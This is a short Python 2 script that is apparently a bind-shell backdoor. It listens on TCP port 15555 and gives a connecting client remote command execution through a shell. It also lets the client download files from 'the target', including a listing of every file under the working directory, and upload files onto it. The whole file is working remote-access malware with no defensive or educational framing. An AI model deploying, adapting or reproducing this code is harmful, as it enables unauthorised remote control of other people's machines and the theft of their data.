#!/usr/bin/env python
# coding: utf-8

# Libraries import
import os
import sys
import socket
import subprocess
import pickle

# serverSocket creation + option so_reuseaddr
serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
serverSocket.bind(('', 15555))
serverSocket.listen(1)
#print "[*] Server is running and listening on 15555 TCP port"
client, address = serverSocket.accept()
#print "[*] {} connected on the server".format(address)

# Processing
try:
	client.sendall("up")
except socket.error, e:
	errorcode=e[1]
	print errorcode

while 1:
	action = client.recv(256)
	if action == "1":
		while 1:
			try:
				commandToRun = client.recv(4096)
				if commandToRun != "":
					try:
						output = subprocess.check_output(commandToRun, stderr=subprocess.PIPE, shell=True)
						client.sendall(output)
					except subprocess.CalledProcessError as errorCmd:
						client.sendall(errorCmd.output)
				else:
					client.close()
					sys.exit()
			except KeyboardInterrupt:
				pass

	if action == "2":
		try:
			waitingFilename = "Enter the filename to download from the target : "
			client.sendall(waitingFilename)
			# Processing request 
			sFilename = client.recv(256)
			cwd = os.getcwd()
			if os.path.exists(cwd+"/"+sFilename):
				openingFile = open(cwd+"/"+sFilename,"rb")
				readingFile = openingFile.read(4096)
				client.sendall(readingFile)
				openingFile.close()
			if not os.path.exists(cwd+"/"+sFilename):
				client.sendall("unknown")
				listing = []
				for root, dirs, files in os.walk(cwd):
   					for r in files:
						listing.append(r)
				data = pickle.dumps(listing)
				client.sendall(data)
				sFilename = client.recv(256)
				if sFilename != "":
					openingFile = open(cwd+"/"+sFilename,"rb")
					readingFile = openingFile.read(4096)
					client.sendall(readingFile)
					openingFile.close()
		except socket.error, e:
			errorcode=e[1]
			print errorcode

	if action == "3":
		try:
			waitingFilename = "Enter the filename to transfer on the target : "
			client.sendall(waitingFilename)
			# processing request
			Filename = client.recv(256)
			cwd = os.getcwd()
			# if file exists in cwd we ask for overwriting
			if os.path.exists(cwd+"/"+Filename):
				known = "1"
				client.sendall(known)
				confirm = client.recv(256)
				if confirm == "1":
					clientFiledata = client.recv(4096)
					uploadedFile = open(Filename, "wb")
					# importing data in the new file
					uploadedFile.write(clientFiledata)
					uploadedFile.close()
					status = "[*] File successfully transfered !"
					client.sendall(status)
				if confirm == "0":
					sys.exit()
			# if file does not exists in cwd we send data directly
			if not os.path.exists(cwd+"/"+Filename):
				known = "0"
				client.sendall(known)
				clientFiledata = client.recv(4096)
				uploadedFile = open(Filename, "wb")
				# importing data in the new file
				uploadedFile.write(clientFiledata)
				uploadedFile.close()
				status = "[*] File successfully transfered !"
				client.sendall(status)
		except:
			pass
#serverSocket.close()
